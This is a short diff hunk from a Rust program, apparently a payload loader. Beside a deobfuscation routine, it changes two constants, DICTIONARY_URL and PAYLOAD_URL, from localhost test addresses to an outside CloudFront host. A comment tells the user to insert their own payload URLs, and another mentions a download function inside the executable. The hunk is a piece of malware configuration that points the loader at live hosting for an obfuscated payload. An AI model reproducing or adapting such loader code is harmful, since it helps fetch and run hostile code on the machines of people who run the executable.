@@ -450,8 +450,8 @@ fn deobfuscate(bytes: &[u8]) -> String {
 
 // URLs for content retrieval - prioritized source
 // Change URLS to your payload and dictionary URLs
-const DICTIONARY_URL: &str = "http://localhost:5500/rust-run/es-dictionary.txt"; 
-const PAYLOAD_URL: &str = "http://localhost:5500/rust-run/load.txt";
+const DICTIONARY_URL: &str = "https://d3d6t1tuvmlrp2.cloudfront.net/es-dictionary.txt"; 
+const PAYLOAD_URL: &str = "https://d3d6t1tuvmlrp2.cloudfront.net/loads.txt";
 
 
 // Enhanced download function that prioritizes URLs from within the executable
